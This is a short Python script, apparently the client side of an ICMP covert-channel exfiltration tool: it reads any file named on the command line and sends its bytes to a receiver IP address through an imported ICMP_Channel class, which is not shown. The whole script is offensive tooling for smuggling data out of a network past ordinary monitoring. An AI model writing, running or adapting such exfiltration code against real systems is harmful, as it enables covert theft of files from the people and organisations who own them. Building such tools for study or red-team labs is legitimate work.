#!/usr/bin/python3

import os, socket, argparse, logging
from channel import Channel, ICMP_Channel

# Initialize logging
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
formatter = logging.Formatter('%(levelname)s: [CLIENT] %(message)s')
handler = logging.StreamHandler()
handler.setFormatter(formatter)
logger.addHandler(handler)

# Initialize argument parsing
parser = argparse.ArgumentParser()

parser.add_argument("inputfile", help="File to read exfiltration data from")
# TODO: chech if valid ip
parser.add_argument("receiver", help="IPv4 of receiver")
# TODO: delay
parser.add_argument("-v", "--verbose", help="Increase output verbosity")
args = parser.parse_args()

# Check if file exists
input_file_content = bytes()
if os.path.exists(args.inputfile):
    with open(args.inputfile, "rb") as file_handle:
        input_file_content = file_handle.read()


icmp = ICMP_Channel(Channel.CLIENT, logger)
icmp.send_data(input_file_content, args.receiver)
icmp.close()
